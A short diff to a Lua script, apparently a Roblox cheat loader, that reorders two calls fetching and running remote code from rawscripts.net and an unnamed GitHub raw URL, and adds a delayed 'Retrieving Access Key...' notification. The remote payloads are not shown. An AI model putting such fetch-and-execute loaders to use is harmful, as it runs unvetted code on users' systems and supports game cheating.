@@ -16,17 +16,17 @@ local function forceLoad(url)
     end)
 end
 
--- Show quick notification
-StarterGui:SetCore("SendNotification", {
-    Title = "Initializing...",
-    Text = "Please wait",
-    Duration = 4
-})
+-- Step 1: Load Speed Hub immediately
+forceLoad("https://rawscripts.net/raw/Universal-Script-Speed-Hub-X-27904")
 
--- Load second script instantly
+-- Step 2: Immediately load second script
 forceLoad("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua")
 
--- Wait 4 seconds then load Speed Hub
-task.delay(4, function()
-    forceLoad("https://rawscripts.net/raw/Universal-Script-Speed-Hub-X-27904")
+-- Step 3: Show notification after 3 seconds
+task.delay(3, function()
+    StarterGui:SetCore("SendNotification", {
+        Title = "🔑 Retrieving Access Key...",
+        Text = "",
+        Duration = 4
+    })
 end)
